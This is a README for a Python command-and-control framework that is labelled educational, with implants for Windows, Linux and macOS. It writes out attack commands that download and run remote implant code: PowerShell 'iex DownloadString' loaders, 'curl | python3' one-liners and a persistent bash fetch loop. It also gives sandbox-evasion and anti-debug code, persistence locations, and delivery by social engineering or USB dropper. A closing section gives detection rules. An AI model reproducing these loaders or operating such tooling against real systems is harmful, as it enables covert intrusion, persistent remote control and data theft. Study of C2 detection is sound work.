# 🕶️ C2 Framework - Enterprise-Grade Command & Control Infrastructure

[![Educational Purpose Only](https://img.shields.io/badge/Purpose-Educational%20Only-red)](LICENSE)
[![Python Version](https://img.shields.io/badge/Python-3.8%2B-blue)](https://python.org)
[![License](https://img.shields.io/badge/License-Educational%20Use%20Only-yellow)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)]()

> **⚠️ WARNING: EDUCATIONAL PURPOSE ONLY**  
> This framework is designed exclusively for cybersecurity training, penetration testing with written authorization, and controlled laboratory environments. Unauthorized use against systems you do not own or have explicit permission to test is **ILLEGAL**.

---

## 📋 Table of Contents
- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Lab Setup Requirements](#-lab-setup-requirements)
- [Quick Start Guide](#-quick-start-guide)
- [Detailed Installation](#-detailed-installation)
- [Usage Guide](#-usage-guide)
- [Cross-Platform Deployment](#-cross-platform-deployment)
- [Evasion Techniques Implemented](#-evasion-techniques-implemented)
- [Detection & Defense](#-detection--defense)
- [Troubleshooting](#-troubleshooting)
- [Educational Modules](#-educational-modules)
- [Project Structure](#-project-structure)
- [Legal & Ethics](#-legal--ethics)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🎯 Overview

This **Command & Control (C2) Framework** is a comprehensive educational tool designed to demonstrate how attackers establish covert communication channels, maintain persistence, and evade detection in compromised environments. Built for cybersecurity professionals, red teamers, blue teamers, and students to understand real-world attacker tradecraft.

### What You'll Learn
- ✅ How C2 channels operate under the hood
- ✅ Beaconing algorithms and jitter implementation
- ✅ Encrypted communication protocols
- ✅ Cross-platform persistence mechanisms
- ✅ Detection evasion techniques
- ✅ Network traffic analysis for C2 detection

---

## ✨ Features

### Core Capabilities
| Feature | Description | Status |
|---------|-------------|--------|
| **Multi-Platform Implant** | Windows, Linux, macOS support | ✅ |
| **HTTP/HTTPS C2 Channels** | Encrypted communication | ✅ |
| **Web Dashboard** | Real-time operator console | ✅ |
| **Multi-Agent Management** | Control multiple hosts simultaneously | ✅ |
| **Task Queuing** | Asynchronous command execution | ✅ |
| **File Transfer** | Upload/download capabilities | ✅ |
| **Persistence** | Registry, crontab, launchd | ✅ |
| **Screen Capture** | Remote screenshot capability | ✅ |

### Technical Specifications
- **Server**: Flask-based REST API
- **Encryption**: AES-256-GCM + RSA-2048 (optional)
- **Beacon Interval**: Configurable with jitter (1-60 seconds)
- **Database**: SQLite (lightweight) / MySQL (production)
- **Communication**: JSON over HTTP/HTTPS

---
─────────────────────────────────────────────────────────────────┐
│ OPERATOR ZONE │
├─────────────────────────────────────────────────────────────────┤
│ │
│ ┌──────────────┐ ┌──────────────┐ │
│ │ Web UI │◄───────►│ CLI Tool │ │
│ │ Port 5000 │ │ (Optional) │ │
│ └──────┬───────┘ └──────────────┘ │
│ │ │
│ ▼ │
│ ┌──────────────────────────────────────────┐ │
│ │ C2 SERVER (Flask) │ │
│ │ Port 443 (HTTPS) / 5000 (HTTP) │ │
│ └──────────────┬───────────────────────────┘ │
│ │ │
│ │ Encrypted C2 Channel │
│ │ (HTTP/HTTPS + AES/RSA) │
└──────────────────┼────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────────────┐
│ COMPROMISED ZONE │
├─────────────────────────────────────────────────────────────────┤
│ │
│ ┌──────────────┐ ┌──────────────┐ ┌──────────────┐ │
│ │ Implant │ │ Implant │ │ Implant │ │
│ │ (Windows) │ │ (Linux) │ │ (macOS) │ │
│ └──────────────┘ └──────────────┘ └──────────────┘ │
│ │
│ Each Implant: │
│ • Beacons at random intervals │
│ • Executes remote commands │
│ • Exfiltrates data │
│ • Maintains persistence │
└─────────────────────────────────────────────────────────────────┘

### Communication Flow
1. **Registration**: Implant → Server (system info, key exchange)
2. **Beaconing**: Implant → Server (heartbeat, task check)
3. **Task Assignment**: Server → Implant (command execution)
4. **Result Delivery**: Implant → Server (command output)

---

## 🖥️ Lab Setup Requirements

### Hardware Requirements
| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **RAM** | 8GB | 16GB |
| **CPU** | 2 cores | 4+ cores |
| **Storage** | 20GB | 50GB SSD |
| **Network** | Isolated lab network | Host-Only + NAT |

### Software Requirements
```bash
# Operating Systems
- C2 Server: Kali Linux 2024+ / Ubuntu 22.04+
- Target Machines: Windows 10/11, Ubuntu 20.04+, macOS 12+

# Python Dependencies
Python 3.8+
Flask
Requests
PyCryptodome (optional, for encryption)
Virtual Network Configuration
┌─────────────────────────────────────────────────┐
│            VIRTUALBOX NETWORK SETUP              │
├─────────────────────────────────────────────────┤
│                                                   │
│   [Kali VM] ─────┐                               │
│   (172.24.1.83)  │                               │
│                  │    Host-Only Network          │
│   [Windows VM] ──┼──── 192.168.56.0/24          │
│   (192.168.56.10)│    or Bridged Adapter        │
│                  │                               │
│   [Ubuntu VM] ───┘                               │
│   (192.168.56.11)                                │
└─────────────────────────────────────────────────┘
🚀 Quick Start Guide
5-Minute Setup
Step 1: Clone Repository (On Kali/Server)
bash
git clone https://github.com/yourusername/c2-framework.git
cd c2-framework
chmod +x setup.sh
sudo ./setup.sh
Step 2: Start C2 Server
bash
# Terminal 1 - Start the C2 server
python3 c2_server_http.py
Expected output:

text
============================================================
C2 HTTP Server Started Successfully!
============================================================
[+] Dashboard URL: http://172.24.1.83:5000
[+] API Endpoint: http://172.24.1.83:5000/api
[+] Press Ctrl+C to stop the server
============================================================
Step 3: Start File Server (For Payload Distribution)
bash
# Terminal 2 - Share payloads via HTTP
cd ~/c2-framework/payloads
python3 -m http.server 8000
Step 4: Deploy Implant to Target (Windows VM)
powershell
# On Windows PowerShell (Admin)
curl -o C:\implant.py http://172.24.1.83:8000/windows_implant.py
python C:\implant.py
Step 5: Access Web Dashboard
Open browser on Windows/Kali:

text
http://172.24.1.83:5000
✅ You're now controlling a remote system!

📥 Detailed Installation
On Kali/Ubuntu (C2 Server)
bash
# 1. System Update
sudo apt update && sudo apt upgrade -y

# 2. Install Dependencies
sudo apt install -y python3 python3-pip git openssl

# 3. Create Project Directory
mkdir -p ~/c2-framework/{server,payloads,logs}
cd ~/c2-framework

# 4. Install Python Packages
pip3 install flask flask-cors requests

# 5. Create SSL Certificate (for HTTPS)
openssl req -x509 -newkey rsa:4096 -nodes \
  -out cert.pem -keyout key.pem \
  -days 365 -subj "/C=US/ST=State/L=City/O=C2/CN=localhost"

# 6. Verify Installation
python3 -c "import flask; print('Flask OK')"
On Windows VM (Target Machine)
powershell
# 1. Install Chocolatey (Package Manager)
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

# 2. Install Python via Chocolatey
choco install python -y

# 3. Refresh Environment Variables
refreshenv

# 4. Install Required Python Package
pip install requests

# 5. Verify Python Installation
python --version
On Linux Target (Ubuntu/Debian)
bash
# Install Python if not present
sudo apt update
sudo apt install -y python3 python3-pip

# Install requests
pip3 install requests

# Run implant
python3 implant.py
📖 Usage Guide
Web Dashboard Interface
1. Agent Management
View Agents: All connected agents appear in left panel

Agent Details: Hostname, username, OS, IP address

Status Indicators: Green = Active, Red = Inactive

2. Command Execution
Available Commands:
┌─────────────────┬────────────────────────────────────────┐
│ Command         │ Description                            │
├─────────────────┼────────────────────────────────────────┤
│ whoami          │ Display current user                   │
│ ipconfig        │ Network configuration (Windows)        │
│ ifconfig        │ Network configuration (Linux/macOS)    │
│ dir / ls        │ List directory contents                │
│ cd <path>       │ Change working directory               │
│ tasklist / ps   │ List running processes                 │
│ systeminfo      │ System information                     │
│ netstat -an     │ Network connections                    │
│ echo "text"     │ Write to file                          │
│ type <file>     │ Read file contents                     │
└─────────────────┴────────────────────────────────────────┘
3. Sending Commands
bash
# Method 1: Web Dashboard
1. Click on agent in left panel
2. Type command in input box
3. Press Enter or click Execute

# Method 2: Direct API
curl -X POST http://C2_IP:5000/api/send_command \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"AGENT_ID","command":"whoami"}'
CLI Operations (Advanced)
bash
# List all agents
curl http://172.24.1.83:5000/api/agents

# Send command to specific agent
curl -X POST http://172.24.1.83:5000/api/send_command \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"df73f1e0","command":"whoami"}'

# Get task results for agent
curl http://172.24.1.83:5000/api/task_results/df73f1e0

# Register test agent (debugging)
curl -X POST http://172.24.1.83:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{"hostname":"test","username":"user","os_type":"Linux","ip_address":"127.0.0.1"}'
🔄 Cross-Platform Deployment
Generate Payloads for Different OS
Windows Payloads
bash
# On Kali - Generate Windows payloads
cd ~/c2-framework/payloads

# Python script (requires Python on target)
python3 -c "print(open('windows_implant.py').read())" > implant.py

# PowerShell loader
cat > loader.ps1 << 'EOF'
$wc=New-Object System.Net.WebClient
$wc.DownloadString('http://172.24.1.83:8000/implant.py') | python -
EOF

# Batch file loader
cat > loader.bat << 'EOF'
@echo off
powershell -ExecutionPolicy Bypass -File loader.ps1
EOF
Linux/macOS Payloads
bash
# Bash one-liner
curl -s http://172.24.1.83:8000/implant.py | python3 &

# Persistent script
cat > implant.sh << 'EOF'
#!/bin/bash
while true; do
    python3 -c "$(curl -s http://172.24.1.83:8000/implant.py)" 2>/dev/null
    sleep 60
done
EOF
chmod +x implant.sh
Deployment Methods
Method	Command	Use Case
Direct Download	curl -o implant.py http://C2_IP:8000/implant.py	Quick testing
PowerShell	powershell -c "iex (New-Object Net.WebClient).DownloadString('http://C2_IP:8000/loader.ps1')"	Windows stealth
SMB Share	copy \\C2_IP\share\implant.py .	Internal networks
Email Attachment	Manual delivery	Social engineering
USB Dropper	Physical access	Air-gapped networks
🛡️ Evasion Techniques Implemented
Network Evasion
python
# 1. Beacon Jitter - Random delays to avoid pattern detection
sleep_time = base_sleep + random.randint(-jitter, jitter)

# 2. User-Agent Randomization
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)'
]

# 3. Domain Fronting (HTTPS)
# Host header differs from connection domain

# 4. Encrypted Payloads (AES-256-GCM)
cipher = AES.new(session_key, AES.MODE_GCM)
Host Evasion
python
# 1. Sandbox Detection
def is_sandbox():
    checks = [
        os.path.exists('/.dockerenv'),
        os.path.exists('/.dockerinit'),
        'vbox' in platform.uname().version.lower()
    ]
    return any(checks)

# 2. Anti-Debug
def anti_debug():
    import sys
    if sys.gettrace() is not None:
        sys.exit(0)

# 3. Process Hollowing (Windows)
# Inject into legitimate processes
Persistence Mechanisms
OS	Method	Location
Windows	Registry Run Key	HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Windows	Scheduled Task	schtasks /create
Windows	Startup Folder	%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
Linux	Crontab	@reboot python3 /path/to/implant.py
Linux	Systemd Service	/etc/systemd/system/
Linux	.bashrc/.profile	~/.bashrc, ~/.profile
macOS	Launch Agent	~/Library/LaunchAgents/
macOS	Login Hook	defaults write com.apple.loginwindow
🔍 Detection & Defense
How Blue Teams Can Detect This C2
Network Indicators
yaml
Beacon Patterns:
  - Regular intervals with jitter (5-15 seconds)
  - HTTP POST to /api/beacon, /api/register
  - JSON payloads with agent_id field
  - Unusual User-Agent strings

Detection Rules (Snort/Suricata):
  alert tcp $HOME_NET any -> $EXTERNAL_NET 5000 
    (msg:"Potential C2 Beacon"; 
     content:"/api/beacon"; http_uri; 
     sid:1000001;)
Host Indicators
yaml
Windows:
  - Suspicious Python processes
  - Registry run keys with python.exe
  - Unusual scheduled tasks
  - Temp directory Python scripts

Linux:
  - Unexpected crontab entries
  - Systemd services named oddly
  - Outbound connections on port 5000/443
  - Python processes with network connections
Memory Forensics (Volatility)
bash
# Detect injected code
vol.py -f memory.dump --profile=Win10x64 malfind

# List network connections
vol.py -f memory.dump netscan

# Detect hidden processes
vol.py -f memory.dump pslist
Defensive Measures
powershell
# 1. Block outbound ports
New-NetFirewallRule -DisplayName "Block C2 Ports" -Direction Outbound -LocalPort 5000,8000,4443 -Protocol TCP -Action Block

# 2. Monitor Python execution
auditpol /set /subcategory:"Process Creation" /success:enable

# 3. AppLocker rules (Windows)
# Restrict script execution to specific directories

# 4. EDR Detection
# Monitor for beaconing patterns, unusual parent-child processes
🐛 Troubleshooting
Common Issues & Solutions
Issue	Cause	Solution
"Connection refused"	Server not running	python3 c2_server_http.py
"No module named flask"	Missing dependency	pip3 install flask flask-cors
Agents not showing	Network isolation	Check VM network settings
Commands timeout	Firewall blocking	sudo ufw allow 5000
SSL certificate error	Self-signed cert	Use verify=False or HTTP
Python not found (Windows)	Python not installed	Install from python.org
Debug Commands
bash
# Check if server is listening
sudo netstat -tlnp | grep 5000

# Test API locally
curl http://localhost:5000/api/agents

# View server logs
tail -f /var/log/c2-server.log

# Test connectivity from Windows
Test-NetConnection 172.24.1.83 -Port 5000
ping 172.24.1.83

# Restart everything
sudo fuser -k 5000/tcp
python3 c2_server_http.py
VirtualBox Network Fix
bash
# On Kali - Reset network
sudo systemctl restart networking
sudo dhclient -r
sudo dhclient

# On Windows - Reset network
ipconfig /release
ipconfig /renew
netsh winsock reset

# Both VMs should use same adapter type
# Recommended: Bridged Adapter or Host-Only
📚 Educational Modules
Module 1: C2 Communication Basics
Objective: Understand beaconing and tasking

Exercise: Modify beacon interval and observe traffic

Module 2: Encryption Implementation
Objective: Implement AES encryption for C2 traffic

Exercise: Add encryption layer to implant-server communication

Module 3: Evasion Techniques
Objective: Learn common evasion methods

Exercise: Implement process injection or DLL sideloading

Module 4: Persistence Mechanisms
Objective: Understand persistence across OSes

Exercise: Add new persistence method (e.g., WMI Event Subscription)

Module 5: Detection Engineering
Objective: Create detection rules for C2 traffic

Exercise: Write YARA/Sigma rules to detect this framework

📁 Project Structure
text
c2-framework/
├── 📄 README.md                    # Documentation
├── 📄 LICENSE                      # Educational use license
├── 📄 setup.sh                     # Automated setup script
│
├── 🐍 c2_server_http.py           # HTTP C2 server (recommended)
├── 🐍 c2_server_https.py          # HTTPS C2 server (SSL)
├── 🐍 c2_server_robust.py         # Production-ready server
│
├── 📁 payloads/
│   ├── 🐍 windows_implant.py      # Windows/Linux/macOS agent
│   ├── 📜 loader.ps1              # PowerShell loader
│   ├── 📜 loader.bat              # Batch loader
│   ├── 📜 implant.sh              # Linux/macOS script
│   └── 📜 loader.vbs              # VBScript loader
│
├── 📁 modules/
│   ├── 🐍 crypto.py               # Encryption utilities
│   ├── 🐍 evasion.py              # Anti-detection methods
│   └── 🐍 persistence.py          # Persistence modules
│
├── 📁 web/
│   ├── 🎨 dashboard.html          # Web UI template
│   ├── 🎨 style.css               # Styling
│   └── 📜 console.js              # Frontend logic
│
├── 📁 logs/
│   ├── 📄 agents.log              # Agent activity
│   ├── 📄 commands.log            # Command history
│   └── 📄 errors.log              # Error logging
│
└── 📁 docs/
    ├── 📄 architecture.md         # System design
    ├── 📄 deployment.md           # Deployment guide
    └── 📄 detection.md            # Detection strategies
⚖️ Legal & Ethics
Acceptable Use
✅ Permitted:

Cybersecurity training in isolated labs

Penetration testing with written authorization

Academic research in controlled environments

CTF competitions and red team exercises

❌ Prohibited:

Unauthorized access to any system

Deployment on production systems without permission

Malicious use for data theft or damage

Violation of computer fraud laws

Legal Compliance
yaml
Laws & Regulations:
  - CFAA (US): Computer Fraud and Abuse Act
  - GDPR (EU): General Data Protection Regulation
  - Computer Misuse Act (UK)
  - Similar laws in your jurisdiction

Authorization Requirements:
  - Written permission from system owner
  - Defined scope of testing
  - Confidentiality agreements
  - Reporting requirements
Responsible Disclosure
If you discover security issues in this framework:

Do not exploit for unauthorized purposes

Report to maintainers immediately

Allow 90 days for fixes before public disclosure

🤝 Contributing
Areas for Contribution
🐛 Bug fixes and stability improvements

🔒 Additional evasion techniques

🖥️ More platform support (Android, iOS)

📊 Enhanced reporting features

🔌 Plugin system for modules

🧪 Unit tests and CI/CD pipeline

How to Contribute
bash
1. Fork repository
2. Create feature branch
   git checkout -b feature/amazing-feature
3. Commit changes
   git commit -m 'Add amazing feature'
4. Push to branch
   git push origin feature/amazing-feature
5. Open Pull Request
Coding Standards
Python: PEP 8 compliance

Comments: Required for complex logic

Testing: Add tests for new features

Documentation: Update README accordingly

📄 License
text
EDUCATIONAL USE ONLY LICENSE

Copyright (c) 2024 C2 Framework Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software for EDUCATIONAL PURPOSES ONLY, subject to the following conditions:

1. The software may only be used in controlled laboratory environments
2. Written authorization must be obtained before testing any system
3. The software may not be used for any malicious purposes
4. This notice shall be included in all copies or substantial portions

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.

THE AUTHORS ARE NOT RESPONSIBLE FOR ANY ILLEGAL USE OF THIS SOFTWARE.
📞 Support & Resources
Documentation
Detailed Wiki

API Reference

Video Tutorials

Community
Discord Server: [Invite Link]

Twitter: [@C2Framework]

Email: c2-framework@educational.org

Recommended Reading
"Command and Control" by Rob Joyce (NSA)

"C2 Threat Intelligence" by MITRE ATT&CK

"Malware Analysis and Detection" by Michael Sikorski

⭐ Acknowledgments
MITRE ATT&CK Framework for TTP classification

Open Source Community for libraries

Cybersecurity educators worldwide

📊 Project Status
text
🟢 ACTIVE - Educational Maintenance Mode

Last Updated: 2024
Python Version: 3.8+
Tested On:
  ✅ Kali Linux 2024.1
  ✅ Ubuntu 22.04 LTS
  ✅ Windows 10/11
  ✅ macOS Ventura+
Remember: With great power comes great responsibility. Use this knowledge to defend, not exploit.



## 🏗️ Architecture
